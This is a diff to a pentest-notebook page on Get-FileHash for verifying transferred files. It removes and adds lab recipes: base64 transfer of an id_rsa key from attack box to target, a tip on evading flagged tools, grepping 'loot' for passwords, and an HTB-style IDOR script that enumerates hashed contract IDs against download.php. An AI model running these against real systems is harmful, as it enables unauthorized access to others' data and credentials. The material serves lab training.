@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/get-filehash.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Compare a transferred file's SHA-256
+[Search this tool’s saved examples](/commands/notebook?tool=get-filehash) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Compare a transferred file's SHA-256
 
 **Run in:** Windows PowerShell. **Requires:** Read access to the received file and a digest from the original bytes.
 
@@ -21,120 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 Get-FileHash -Path 'C:\Users\Public\file.bin' -Algorithm SHA256
 ```
 
-**Read the result:** Compare the same algorithm over the actual source and destination bytes.
-
-**If Hashes differ despite matching filenames:** Matching filenames or sizes are weaker checks; an algorithm mismatch or modified line endings can explain different digests.
+**What the result establishes:** Compare the same algorithm over the actual source and destination bytes.
 
 **Next check:** Check the source version, transfer completeness and accidental text conversion; filename equality is not content equality.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Get-FileHash: choose the operation and read the result
-
-Verify that a transferred file matches the original.
-
-### What the result establishes
-
-Compare the same algorithm over the actual source and destination bytes.
-
-### Prerequisites and common failures
-
-Matching filenames or sizes are weaker checks; an algorithm mismatch or modified line endings can explain different digests.
-
-### Example 1: Commands
-
-Run in: **Windows PowerShell**.
-
-```powershell
-Get-FileHash C:\Users\Public\file.zip -Algorithm SHA256
-```
-
-### Example 2: Base64 Encode & Decode (No Network Needed)
-
-Run in: **Saved lab example**.
-
-```powershell
-Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: Base64 Encode & Decode (Upload)
-
-Run in: **Saved lab example**.
-
-```bash
-echo <base64_string> | base64 -d > hosts
-md5sum hosts    # verify hash matches
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Base64 Encode & Decode (No Network Needed)
-
-Run in: **Saved lab example**.
-
-```bash
-md5sum id_rsa                        # note the hash to verify later
-cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous string
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: Base64 Encode & Decode
-
-Run in: **Saved lab example**.
-
-```bash
-# On attack box — encode
-cat id_rsa | base64 -w 0; echo
-md5sum id_rsa
-
-# On target — decode
-echo -n '<base64_string>' | base64 -d > id_rsa
-md5sum id_rsa    # verify match
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Base64 Encode & Decode (Upload)
-
-Run in: **Saved lab example**.
-
-```powershell
-[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
-Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
-```
-
-Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: 2. First contact — confirming it's actually malware
-
-Run in: **Saved lab example**.
-
-```bash
-sha256sum sample.apk
-```
-
-Saved context: [Android Banking Trojan: Reverse-Engineering Walkthrough — 2. First contact — confirming it's actually malware](/research/android-malware-walkthrough#2-first-contact-—-confirming-its-actually-malware). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Verify that a transferred file matches the original.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=get-filehash) · [All tools](/index)
 
 ## Commands
 
@@ -144,27 +41,36 @@ Replace UPPER_CASE values with your lab values.
 Get-FileHash C:\Users\Public\file.zip -Algorithm SHA256
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| Hashes differ despite matching filenames | Matching filenames or sizes are weaker checks; an algorithm mismatch or modified line endings can explain different digests. |
 
 ## Notebook recipes
 
-9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+18 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
-<Accordion title="2. First contact — confirming it&#x27;s actually malware">
+<Accordion title="Search and compare local evidence">
 
-### 2. First contact — confirming it's actually malware
+### Search and compare local evidence
 
-**Android Banking Trojan: Reverse-Engineering Walkthrough**
+**Everyday Terminal Commands: Guide Link**
 
 ```bash
-sha256sum sample.apk
+rg -n -i 'password|credential|connectionstring' notes loot
+find loot -type f -iname '*config*'
+sort discovered-users.txt | uniq -c
+wc -l discovered-users.txt
+file loot/artifact
+sha256sum loot/artifact
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Android Banking Trojan: Reverse-Engineering Walkthrough — 2. First contact — confirming it's actually malware](/research/android-malware-walkthrough#2-first-contact-—-confirming-its-actually-malware)
+**Original note sections:** [Everyday Terminal Commands: Guide Link — Search and compare local evidence](/tools/common-commands#search-and-compare-local-evidence)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -263,6 +169,87 @@ md5sum hosts    # verify hash matches
 
 </Accordion>
 
+<Accordion title="Test actual bytes and image processing">
+
+### Test actual bytes and image processing
+
+**File Upload Attacks**
+
+```bash
+exiftool sample.png
+sha256sum sample.png
+curl -sS "$BASE/uploads/ACTUAL_STORED_NAME.png" -o retrieved.png
+file retrieved.png
+exiftool retrieved.png
+sha256sum retrieved.png
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Test actual bytes and image processing](/web/file-upload#test-actual-bytes-and-image-processing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Encoded and hashed object references">
+
+### Encoded and hashed object references
+
+**IDOR and API Authorization**
+
+```bash
+# GNU tools on Kali: no added newline at either stage.
+printf %s '1' | base64 -w 0 | md5sum
+
+# Portable equivalent; this only computes local example values.
+python3 - <<'PY'
+import base64, hashlib
+for object_id in ('1', '2'):
+    encoded = base64.b64encode(object_id.encode())
+    print(object_id, encoded.decode(), hashlib.md5(encoded).hexdigest())
+PY
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Encoded and hashed object references](/web/idor#encoded-and-hashed-object-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**IDOR and API Authorization**
+
+```bash
+CONTRACT=$(printf %s "$B_ID" | base64 -w 0 | md5sum | cut -d ' ' -f1)
+curl -sS -b "PHPSESSID=$SESSION_A" --data-urlencode "contract=$CONTRACT" \
+  -D evidence/idor/contract.headers -o evidence/idor/contract.bin "$BASE/download.php"
+file evidence/idor/contract.bin
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Encoded and hashed object references](/web/idor#encoded-and-hashed-object-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Download a served file from Kali to Windows">
+
+### Download a served file from Kali to Windows
+
+**Kali → Windows file transfer**
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
+Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
+```
+
+</Accordion>
+
 <Accordion title="2. Password Cracking Fundamentals">
 
 ### 2. Password Cracking Fundamentals
@@ -303,21 +290,132 @@ echo -n 'Th1sIsTh3S@lt_Soccer06!' | md5sum
 
 </Accordion>
 
-<Accordion title="Why this matters &amp; how to choose a method">
+<Accordion title="Bypassing Encoded References">
 
-### Why this matters & how to choose a method
+### Bypassing Encoded References
 
-**File Transfers for Linux and Windows**
-
-Context from the notebook: Stealth:  blend with normal traffic (HTTP + a browser user-agent), avoid signatured tools (certutil is flagged), and verify every transfer with a hash ( md5sum  /  Get-FileHash ).
+**Web Attacks — HTB Module**
 
 ```text
-Get-FileHash
+grcic550@htb[/htb]$ echo -n 1 | md5sum
+
+c4ca4238a0b923820dcc509a6f75849b -
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [File Transfers for Linux and Windows — Why this matters & how to choose a method](/post-exploitation/file-transfers-cheat-sheet#why-this-matters-&-how-to-choose-a-method) · [File Transfers for Linux and Windows — Notes](/post-exploitation/file-transfers-cheat-sheet#notes)
+**Original note sections:** [Web Attacks — HTB Module — Bypassing Encoded References](/web/htb/web-attacks#bypassing-encoded-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Function Disclosure">
+
+### Function Disclosure
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Function Disclosure](/web/htb/web-attacks#function-disclosure)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Mass Enumeration">
+
+### Mass Enumeration
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b
+0b7e7dee87b1c3b98e72131173dfbbbf
+0b24df25fe628797b3a50ae0724d2730
+f7947d50da7a043693a592b4db43b0a1
+8b9af1f7f76daf0f02bd9c48c4a2e3d0
+006d1236aee3f92b8322299796ba1989
+b523ff8d1ced96cef9c86492e790c2fb
+d477819d240e7d3dd9499ed8d23e7158
+3e57e65a34ffcb2e93cb545d024f5bde
+5d4aace023dc088767b4e08c79415dcd
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Capture a normal request with the correct identity">
+
+### 2. Capture a normal request with the correct identity
+
+**Web: Enumeration Methodology**
+
+```bash
+file sample.png
+sha256sum sample.png
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web: Enumeration Methodology — 2. Capture a normal request with the correct identity](/web/methodology#2-capture-a-normal-request-with-the-correct-identity)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="4. Follow the stored object through retrieval">
+
+### 4. Follow the stored object through retrieval
+
+**Web: Enumeration Methodology**
+
+```bash
+file evidence/web/downloaded.bin
+sha256sum sample.png evidence/web/downloaded.bin
+cmp sample.png evidence/web/downloaded.bin
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web: Enumeration Methodology — 4. Follow the stored object through retrieval](/web/methodology#4-follow-the-stored-object-through-retrieval)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -326,6 +424,10 @@ Get-FileHash
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -333,5 +435,3 @@ Get-FileHash
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
